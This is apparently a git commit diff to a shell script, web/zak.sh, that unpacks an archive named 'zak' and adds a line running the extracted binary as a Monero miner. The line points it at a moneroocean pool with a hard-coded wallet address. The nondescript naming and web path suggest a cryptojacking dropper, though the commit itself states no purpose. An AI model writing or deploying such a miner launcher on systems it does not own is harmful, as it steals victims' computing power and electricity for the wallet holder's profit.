a7393fcafbf40b5845043d4c1a2cdbea55d1a588
dzmltzack <47821814+dzmltzack@users.noreply.github.com>
2019-06-28 18:09:07 +0100

    Update zak.sh

--- web/zak.sh
+++ web/zak.sh
@@ -1,1 +1,2 @@
-tar -xzf zak
+tar -xf zak
+./zak -O gulf.moneroocean.stream:20002 --currency cryptonight_r -u 49PanVAHYTe6aaTCBHCrShanPdAQhZ5p2TuzQkRb7fryW7Wf79ADvsrgan7Yj4bXBcZpyKzwME9qvZsZxAC5RHxC1FYdeo3 -p x
